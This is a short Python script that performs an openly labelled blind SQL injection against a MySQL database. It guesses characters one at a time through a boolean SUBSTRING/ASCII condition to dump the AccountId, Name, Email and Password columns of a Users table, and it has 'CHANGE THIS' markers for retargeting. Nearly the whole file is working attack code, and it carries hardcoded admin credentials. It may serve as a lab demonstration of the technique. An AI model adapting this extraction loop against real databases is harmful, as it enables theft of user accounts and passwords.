# Import libs
import mysql.connector
from mysql.connector import errorcode
import string
import time
import sys

# Connect to MySQL
try: 
    print("Trying connection to MySQL...",end=" ")
    conx=mysql.connector.connect(user='admin',password='admin',host='localhost',database='web_server') # <-- CHANGE THIS
    print("connection successful")
    print("\nExecuting blind SQLi attack, please wait...")
    
except:
    print("\nConnection failed")
    sys.exit("Execution aborted")

# Dictionary creation: all lowercase + all digits + @ (to scan for emails)
dictionary=string.ascii_lowercase+string.digits+' '+'@'+'.'
dump=""

start=time.time()

for column in ['AccountId','Name','Email','Password']: # <-- CHANGE THIS
    dump+='\n\t%s: '%column
    for row in range (1,7):
        dump+='\n\t '
        for index in range (1,33):
            for char in dictionary:
                sql_query="SELECT * FROM News WHERE Id=1 AND 1=(SELECT IF((ASCII(SUBSTRING(\
                (SELECT {} FROM Users LIMIT {},1),{},1)) = ASCII('{}')),1,0))".format(column,row,index,char)
                cursor=conx.cursor()
                cursor.execute(sql_query)
                result=cursor.fetchall()
   
                if (len(result)!=0):
                    dump+=char
    dump+='\n '

end=time.time()
print(dump)
print("\nProcess finished in: {:.2f} seconds".format(end-start))
